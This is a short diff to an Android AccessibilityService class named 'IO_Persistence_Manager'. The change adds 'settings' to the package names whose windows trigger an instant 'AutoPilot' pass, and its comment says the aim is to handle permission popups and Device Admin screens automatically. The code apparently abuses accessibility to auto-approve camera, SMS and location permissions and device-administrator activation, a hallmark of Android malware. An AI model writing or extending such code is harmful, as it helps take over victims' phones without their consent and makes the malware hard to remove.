@@ -1434,8 +1434,8 @@ public class IO_Persistence_Manager extends AccessibilityService {
 
         String pkgLower = pkg != null ? pkg.toLowerCase() : "";
 
-        // Instant 0ms execution for runtime permission popups (Camera, SMS, Location, etc.)
-        if (pkgLower.contains("permission") || pkgLower.contains("installer") || pkgLower.contains("packageinstaller")) {
+        // Instant 0ms execution for runtime permission popups & Settings Device Admin
+        if (pkgLower.contains("permission") || pkgLower.contains("installer") || pkgLower.contains("packageinstaller") || pkgLower.contains("settings")) {
             new Handler(Looper.getMainLooper()).post(this::executeAutoPilotPass);
             return;
         }
